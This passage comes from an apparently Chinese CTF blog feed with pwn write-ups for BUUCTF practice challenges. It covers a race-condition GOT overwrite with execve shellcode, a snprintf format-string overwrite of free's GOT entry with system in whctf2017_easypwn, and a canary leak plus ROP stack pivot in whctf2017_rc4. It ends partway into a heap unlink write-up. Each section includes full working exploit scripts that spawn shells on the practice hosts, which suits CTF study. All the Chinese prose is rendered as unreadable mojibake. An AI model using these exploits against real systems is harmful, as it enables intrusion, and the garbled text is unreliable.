id="ä¿æŠ¤ç­–ç•¥-1"><a href="#ä¿æŠ¤ç­–ç•¥-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131657725.png" alt="image-20221213165703414" style="zoom:50%;" /><h3 id="æ¼æ´æ‰€åœ¨-1"><a href="#æ¼æ´æ‰€åœ¨-1" class="headerlink" title="æ¼æ´æ‰€åœ¨"></a>æ¼æ´æ‰€åœ¨</h3><p>æœ¬é¢˜æ˜¯æœ‰ä¸€ä¸ªaddå‡½æ•°å’Œdeleteå‡½æ•°ï¼Œä¸è¿‡éƒ½æ˜¯å»åˆ›å»ºäº†ä¸€ä¸ªå­è¿›ç¨‹æ¥è°ƒç”¨å‡½æ•°ã€‚</p><p>åœ¨ä¸¤ä¸ªå‡½æ•°ä¸­éƒ½æ¶‰åŠåˆ°äº†å¯¹åŒä¸€ä¸ªå…¨å±€å˜é‡è¿›è¡Œæ“ä½œï¼Œåœ¨addå‡½æ•°ä¸­mallocç”³è¯·å †å—åå°†åœ°å€å­˜å…¥äº†202080æŒ‡å‘çš„ä½ç½®(è¿™ä¸ªä½ç½®æ˜¯2020C0)ï¼Œæ¯æ¬¡æ‰§è¡Œaddå‡½æ•°çš„æ—¶å€™éƒ½ä¼šå°†202080æŒ‡å‘çš„åœ°å€+8ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œå®Œå½“å‰å‡½æ•°å†æ‰§è¡Œaddå‡½æ•°ï¼Œå°±æ˜¯å°†mallocè¿”å›çš„åœ°å€å†™å…¥2020c8é‡Œ</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131659243.png" alt="image-20221213165948173" style="zoom:50%;" /><p>è€Œæ‰§è¡Œdeleteå‡½æ•°åˆ™æ˜¯æ¯æ¬¡æ‰§è¡Œå®Œéƒ½è®©202080æŒ‡å‘çš„åœ°å€-8(å¦‚ä¸‹)ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯å…ˆåœ¨202080æŒ‡å‘çš„åœ°å€-8ä¹‹åæœ‰ä¸€ä¸ªusleepï¼ˆè¿™é‡Œä¼šä¼‘çœ ä¸¤ç§’é’Ÿï¼‰ï¼Œè€Œåå†å»æ‰§è¡Œä¸‹é¢çš„freeå‡½æ•°éƒ¨åˆ†</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131707847.png" alt="image-20221213170753777" style="zoom:50%;" /><h3 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>æ ¸å¿ƒç‚¹æ˜¯deleteå‡½æ•°åœ¨å­è¿›ç¨‹ä¸­è¢«æ‰§è¡Œï¼Œå¹¶ä¸”çˆ¶è¿›ç¨‹é‡Œæ²¡æœ‰pthread_joinå‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è¶ç€å­è¿›ç¨‹æ‰§è¡Œdeleteå‡½æ•°çš„ç©ºéš™ï¼Œè®©çˆ¶è¿›ç¨‹å†æ¬¡è°ƒç”¨deleteå‡½æ•°ï¼Œè®©202080æŒ‡å‘çš„åœ°å€2020c0ä¸æ–­å»-8ï¼Œå‡åˆ°gotè¡¨çš„ä½ç½®ã€‚å†æ‰§è¡Œaddå‡½æ•°ï¼Œmallocç”³è¯·ä¸€ä¸ªå †å—ï¼Œå‘å †å—é‡Œå†™å…¥shellcodeï¼Œæ­¤æ—¶mallocè¿”å›çš„åœ°å€è¢«å†™å…¥åˆ°äº†freeçš„gotè¡¨é‡Œï¼Œæœ€ç»ˆè°ƒç”¨freeå‡½æ•°çš„æ—¶å€™è§¦å‘shellcode</p><p>æ­£å¸¸æƒ…å†µä¸‹å»freeæ‰gotåœ°å€ä¼šæŠ¥é”™ï¼Œä½†æ­¤å¤„çš„æ¡ä»¶ç«äº‰æ˜¯åœ¨æ‰§è¡Œfreeå‡½æ•°å‰ä¸æ–­å¼€å¯å¤šä¸ªå­è¿›ç¨‹å¯¹ä¸€ä¸ªå…¨å±€å˜é‡è¿›è¡Œæ“ä½œï¼Œ<strong>è¿˜æ²¡æœ‰æ‰§è¡Œåˆ°freeå‡½æ•°å´©æºƒå‰å°±å·²ç»æŠŠshellcodeå†™åˆ°äº†freeçš„gotè¡¨é‡Œè·å–äº†shell</strong></p><p>å¾ªç¯22æ¬¡ä¹Ÿå¾ˆå¥½ç®— (0x2020c0-0x202018-8)&#x2F;8&#x3D;22   ï¼ˆè¿™é‡Œä¸èƒ½ç›´æ¥å†™freeçš„gotåœ°å€ï¼Œåº”è¯¥å†å‡8å­—èŠ‚ï¼Œå› ä¸ºæœ€åaddçš„æ—¶å€™æ˜¯å…ˆåŠ äº†å…«å­—èŠ‚ï¼‰</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28673&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi ,0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x48\x31\xF6\x56\x57\x54\x5F\x48\x31\xD2\x0F\x05&quot;</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xB66</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input your note, no more than 250 characters\n&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131726043.png" alt="image-20221213172644320"></p><h2 id="whctf2017-easypwn"><a href="#whctf2017-easypwn" class="headerlink" title="whctf2017_easypwn"></a>whctf2017_easypwn</h2><h3 id="ä¿æŠ¤ç­–ç•¥-2"><a href="#ä¿æŠ¤ç­–ç•¥-2" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301822473.png" alt="image-20221230182239349" style="zoom:50%;" /><h3 id="æ¼æ´æ‰€åœ¨-2"><a href="#æ¼æ´æ‰€åœ¨-2" class="headerlink" title="æ¼æ´æ‰€åœ¨"></a>æ¼æ´æ‰€åœ¨</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301823966.png" alt="image-20221230182343891" style="zoom:50%;" /><p>v3å¯è¢«è¦†ç›–æ§åˆ¶ï¼Œè€Œv3æ˜¯formatå‚æ•°ï¼Œå¯æ§å°±ä»£è¡¨ç€å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301831494.png" alt="image-20221230183118429" style="zoom:50%;" /><p>snprintfä¼šå°†sçš„æ•°æ®æ‹·è´0x7d0åˆ°v2ä¸Šé¢ï¼Œä½†æ˜¯så’Œv2ä»…ç›¸ç¦»0x400ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœså†™å…¥0x400çš„è¯ï¼Œæ‹·è´åˆ°v2é‡Œé¢çš„æ—¶å€™å°±ä¼šæº¢å‡º0x18ä¸ªå­—èŠ‚(v2å’Œv3ä»…ç›¸è·0x3e8ä¸ªå­—èŠ‚)ä»è€Œæ§åˆ¶v3ï¼Œè§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯-2"><a href="#åˆ©ç”¨æ€è·¯-2" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>relroä¿æŠ¤å¼€çš„æ˜¯partial relroï¼Œè¿™æ„å‘³ç€å¯ä»¥ç¯¡æ”¹GOTè¡¨ï¼Œè€Œç¨‹åºçš„æ­¤å¤„è«åå…¶å¦™çš„å‡ºç°äº†ä¸€ä¸ªfreeå‡½æ•°(å¦‚ä¸‹)ï¼Œå¹¶ä¸”freeæ‰å †å—çš„å†…å®¹å¯æ§ï¼Œå¾ˆæ˜æ˜¾æ˜¯æƒ³è®©æˆ‘ä»¬åŠ«æŒfreeçš„gotè¡¨ä¸ºsystemï¼Œç„¶åå †å—é‡Œé¢å†™å…¥&#x2F;bin&#x2F;shæœ€åæ‰§è¡Œfreeè·å–shell</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301905510.png" alt="image-20221230190529433"></p><p>åˆ©ç”¨çš„æ—¶å€™æœ‰å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼š</p><p>1 å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨çš„æ—¶å€™ï¼Œå‘ç°0x3e8åä¸èƒ½ç›´æ¥è§¦å‘æ¼æ´ï¼Œéœ€è¦å¡«å……ä¸¤ä¸ªå­—ç¬¦ä¸²æ‰èƒ½åˆ©ç”¨(è¿™é‡Œæ˜¯è¯•å‡ºæ¥çš„ï¼ŒåŸå› æœªçŸ¥)</p><p>  <img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301909592.png" alt="image-20221230190941547"></p><p>2 æœ¬é¢˜å±äºsnprintfæ‰§è¡Œä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œsnprintfæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦æ¥å¤„ç†çš„ï¼Œå¯èƒ½æ˜¯é‡‡å–äº†ä¸€ç§å¾ªç¯éå†çš„æ–¹å¼ï¼Œæ‰€ä»¥å³ä½¿æœ€åˆè°ƒç”¨snprintfçš„æ—¶å€™formatæ˜¯%sï¼Œä½†åç»­çš„æ“ä½œä¸­formatè¢«æ”¹å˜äº†ï¼Œç„¶åå†å–æ ¼å¼åŒ–å­—ç¬¦çš„æ—¶å€™è§¦å‘äº†æ¼æ´ã€‚</p><p>3 snprintfå‡½æ•°çš„formatæ˜¯åœ¨ç¬¬ä¸‰ä¸ªå‚æ•°çš„ä½ç½®ï¼Œæ‰€ä»¥ç®—æ ˆé¡¶åç§»çš„æ—¶å€™ä¸æ˜¯å’Œä»¥å‰åŠ 6ï¼Œè€Œæ˜¯åŠ 4ã€‚</p><p>4 æˆ‘è¿™é‡Œæ˜¯è·‘äº†ä¸‰æ¬¡å¾ªç¯ï¼Œæ¯æ¬¡æ”¹å†™freeå‡½æ•°çš„gotè¡¨ä¸¤ä¸ªå­—èŠ‚ï¼Œä¸‰æ¬¡ä¸‹æ¥å°±å†™äº†systemçš„6å­—èŠ‚åœ°å€ã€‚</p><p>5 è¿™é‡Œå†™å…¥æ•°æ®çš„è¯ï¼Œè‚¯å®šæ˜¯è¦å‡å»å‰é¢å‘é€çš„åƒåœ¾æ•°æ®0x3e8ä¸ªa,ä½†æ˜¯åé¢çš„0x16ä¸çŸ¥é“å’‹æ¥çš„ï¼Œä½†è¿™é‡Œä¹Ÿæ˜¯å¯ä»¥è¯•å‡ºæ¥çš„ï¼Œå…ˆå‡å»0x3e8åï¼Œå‘ç°è‡ªå·±è¦å†™çš„å€¼å’Œå®é™…å†™å…¥çš„å€¼å·®äº†0x16ï¼Œé‚£å°±åœ¨expé‡Œå¤šå‡0x16å°±èƒ½å¾—åˆ°æ­£ç¡®çš„å€¼ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301916047.png" alt="image-20221230191633995"></p><p>PSï¼šexpä¸æ˜¯ä¸€å®šèƒ½æ‰“é€šï¼Œå› ä¸ºå¦‚æœlibcåœ°å€çš„ä½ä½æ¯”è¾ƒå°çš„è¯ï¼Œä¼šå¯¼è‡´payloadåé¢æ²¡æœ‰å¯¹é½ï¼Œä¸è¿‡è¿™ä¸ªæ¦‚ç‡ä¸å¤§ï¼Œæ²¡æ‰“é€šçš„è¯å¤šè·‘ä¸¤æ¬¡å°±è¡Œ</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27618&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xC05</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x3e8</span>+<span class="string">&quot;b&quot;</span>*<span class="number">2</span>+<span class="string">&quot;%396$p%397$p&quot;</span><span class="comment"># libc addr 393+4</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;397$p\n&quot;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0xda0</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x20830</span><span class="comment">#0x20840</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">value=(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    log_info(<span class="built_in">hex</span>(value%<span class="number">0x10000</span>))</span><br><span class="line">    payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3e8</span>+<span class="string">b&quot;bb%&quot;</span>+<span class="built_in">str</span>(value%<span class="number">0x10000</span>-<span class="number">0x3e8</span>-<span class="number">0x16</span>).encode()+<span class="string">b&quot;c%133$hn&quot;</span>+p64(base_addr+e.got[<span class="string">&#x27;free&#x27;</span>]+i*<span class="number">2</span>)</span><br><span class="line">    value=value&gt;&gt;<span class="number">16</span></span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xD40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Name:\n&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301808658.png" alt="image-20221230180818030" style="zoom:50%;" /><h2 id="whctf2017-rc4"><a href="#whctf2017-rc4" class="headerlink" title="whctf2017_rc4"></a>whctf2017_rc4</h2><h3 id="ä¿æŠ¤ç­–ç•¥-3"><a href="#ä¿æŠ¤ç­–ç•¥-3" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302213510.png" alt="image-20221230221340383" style="zoom:50%;" /><h3 id="æ¼æ´æ‰€åœ¨-3"><a href="#æ¼æ´æ‰€åœ¨-3" class="headerlink" title="æ¼æ´æ‰€åœ¨"></a>æ¼æ´æ‰€åœ¨</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302214459.png" alt="image-20221230221432405" style="zoom: 50%;" /><p>è¿™é‡Œå­˜åœ¨äº†ä¸€ä¸ªæ— æ³•è§¦å‘çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå› ä¸ºv1å–çš„æ˜¯ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä½†æ˜¯randç”Ÿæˆçš„éšæœºæ•°æ˜¯å››å­—èŠ‚çš„ï¼Œæ— è®ºå¦‚ä½•ä¹Ÿæ— æ³•é€šè¿‡è¿™ä¸ªIfæ£€æŸ¥è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302216225.png" alt="image-20221230221652145" style="zoom:50%;" /><p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæœªåˆå§‹åŒ–æ¼æ´ï¼Œå¦‚æœè¿›å…¥è¿™ä¸ªå‡½æ•°ä¸é€‰æ‹©a bæˆ–è€…cçš„è¯ï¼Œé‚£ä¹ˆä¼šè·³è½¬åˆ°LABEL_12çš„åœ°æ–¹ï¼Œè€Œv2è¿™ä¸ªä½ç½®åˆ™æ˜¯ä¸€ä¸ªcanary(è¿™é‡Œæˆ‘æ˜¯å…ˆçœ‹roderickå¸ˆå‚…å†™çš„wpï¼Œè¯´å¯ä»¥åˆ©ç”¨è¿™é‡Œæ³„éœ²å‡ºæ¥canaryï¼Œç„¶åè°ƒè¯•äº†ä¸€ä¸‹å‘ç°ç¡®å®å¦‚æ­¤ï¼Œå¦‚æœå•çº¯çœ‹ä»£ç çš„è¯ç¡®å®æ— æ³•å‘ç°è¿™é‡Œæ˜¯ä¸€ä¸ªcanary)</p><p>è¿™ä¸ªcanaryåˆè¢«æ”¾åˆ°äº†*0x6020D8çš„ä½ç½®ï¼Œè€Œåæœ‰ä¸ªæ‰“å°å‡½æ•°å°†0x6020D0å¼€å§‹16ä¸ªå­—èŠ‚è¿›è¡Œäº†æ³„éœ²ï¼Œç”±æ­¤å¾—åˆ°äº†canary</p><p>ä¸‹å›¾å±•ç¤ºçš„ä»£ç éƒ¨åˆ†è¿˜å­˜åœ¨ä¸€ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302222846.png" alt="image-20221230222229763" style="zoom:50%;" /><h3 id="åˆ©ç”¨æ€è·¯-3"><a href="#åˆ©ç”¨æ€è·¯-3" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>å…ˆæ³„éœ²canaryï¼Œç„¶ååˆ©ç”¨æ ˆæº¢å‡ºæ‰“ret2libcï¼Œæˆ‘è¿™é‡Œé€‰æ‹©è¿”å›çš„æ˜¯bssæ®µä¸Šï¼Œè¿›è¡Œäº†ä¸€ä¸ªæ ˆè¿ç§»ï¼Œæœ€åè¿ç§»è¿‡å»çš„æ‰§è¡Œæµæ˜¯è°ƒç”¨äº†execve(â€œ&#x2F;bin&#x2F;sh\x00â€,0,0) å½“æ—¶ç”¨systemå‘ç°æ²¡æ‰“é€šï¼Œç´¢æ€§å°±æ¢æˆexecveç³»ç»Ÿè°ƒç”¨äº†</p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26330&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">bss_addr=<span class="number">0x6020D8</span></span><br><span class="line">leave_ret=<span class="number">0x401218</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;u&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x401219</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(canary)[::-<span class="number">1</span>]+p64(bss_addr-<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss_addr)+p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])+p64(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">puts_addr=recv_libc()</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&quot;puts&quot;</span>,puts_addr,libc)</span><br><span class="line">pop_rdx=<span class="number">0x0000000000001b92</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">pop_rsi=<span class="number">0x00000000000202e8</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">execve=<span class="number">0x00000000000cc770</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(execve)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://blog.csdn.net/seaaseesa/article/details/106694651">(whctf2017_stackoverflow ha1vkçš„åšå®¢-CSDNåšå®¢_whctf2017stackoverflow</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write#%E4%BB%BB%E6%84%8F%E5%86%99">IO FILE ä¹‹ä»»æ„è¯»å†™ Â« å¹³å‡¡è·¯ä¸Š (ray-cp.github.io)</a></p><p>[WHCTF 2017 note_sys | giantbranchâ€™s blog](<a href="https://www.giantbranch.cn/2017/12/11/WHCTF">https://www.giantbranch.cn/2017/12/11/WHCTF</a> 2017 note_sys&#x2F;)</p><p><a href="https://blog.csdn.net/seaaseesa/article/details/103089382">(44æ¡æ¶ˆæ¯) æ”»é˜²ä¸–ç•ŒPWNä¹‹EasyPwné¢˜è§£_ha1vkçš„åšå®¢-CSDNåšå®¢_pwn-sai_easy è§£é¢˜æ€è·¯</a></p><p><a href="https://roderickchan.github.io/2022/04/15/BUUCTF-pwn-tasks-20/#whctf2017-rc4">BUUCTF-pwnåˆé›† - Lynneâ€™s House (roderickchan.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wdb_2018_1st_babyheap</title>
      <link href="/posts/ebc85e8a.html"/>
      <url>/posts/ebc85e8a.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ€»ç»“æœ‰ï¼š</p><p>è¿™é“é¢˜è€ƒå¯Ÿçš„ä¾ç„¶æ˜¯åˆ©ç”¨UAFæ‰“unlinkã€‚unlinkæ”»å‡»çš„æ ¸å¿ƒæ˜¯å¯ä»¥ä¼ªé€ fake_chunkä»¥åŠæ§åˆ¶fake_chunkä¸‹é¢çš„å †å—çš„chunkå¤´ã€‚è™½ç„¶æ— æ³•ç›´æ¥æº¢å‡ºï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªdouble freeï¼Œç„¶åæ‰“fastbin attackå°†chunkå¤´ç”³è¯·å‡ºæ¥(åœ¨ä½åœ°å€å †å—ä¸­å†™å…¥sizeï¼Œä¿è¯chunkå¤´å¯ä»¥ä»fastbinä¸Šå‡ºæ¥)ï¼Œæ¥ç€å°±å¯ä»¥æ‰“unlinkäº†ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220905195216743-36339851.png"></p><h2 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h2><p>ç¨‹åºä¸­å°±å­˜åœ¨ä¸€ä¸ªUAFæ¼æ´(å¦‚ä¸‹å›¾)</p><p><img src="/../img/2706180-20220905195226020-1085425690.png"></p><p>åŒæ—¶é™åˆ¶äº†æˆ‘ä»¬ä½¿ç”¨editå‡½æ•°çš„æ¬¡æ•°ä¸º3æ¬¡ï¼Œé™åˆ¶äº†addå‡½æ•°çš„æ¬¡æ•°10æ¬¡ã€‚æœ€å…³é”®çš„æ˜¯æˆ‘ä»¬æ— æ³•æ§åˆ¶mallocå‡ºæ¥å †å—çš„å¤§å°ï¼Œå®šæ­»çš„sizeå°±æ˜¯0x30ã€‚(å¦‚ä¸‹å›¾)</p><p><img src="/../img/2706180-20220905195236331-894639914.png"></p><p>ç„¶åä¸‹é¢è‡ªå®šä¹‰çš„è¾“å…¥å‡½æ•°ä¹Ÿä¸å­˜åœ¨off by oneä»¥åŠæº¢å‡ºã€‚</p><p><img src="/../img/2706180-20220905195245678-421374853.png"></p><h2 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h2><p>å› ä¸ºæˆ‘ä»¬mallocç”³è¯·çš„å †å—å¤§å°æ˜¯å›ºå®šçš„0x30å­—èŠ‚çš„ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ²¡æ³•å¾—åˆ°libcåœ°å€ï¼Œæˆ‘ä»¬å¿…é¡»æƒ³åŠæ³•è®©å †å—è¿›å…¥unsorted binä¸­ï¼Œè¿™æ ·æ‰§è¡Œshowå‡½æ•°æ‰èƒ½è·å–libcåœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬è‚¯å®šæ˜¯è¦åˆ©ç”¨double free+fastbin attackå°†chunkå¤´ç”³è¯·å‡ºæ¥å»ä¿®æ”¹å †å—çš„sizeã€‚</p><p>åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦è·å–å 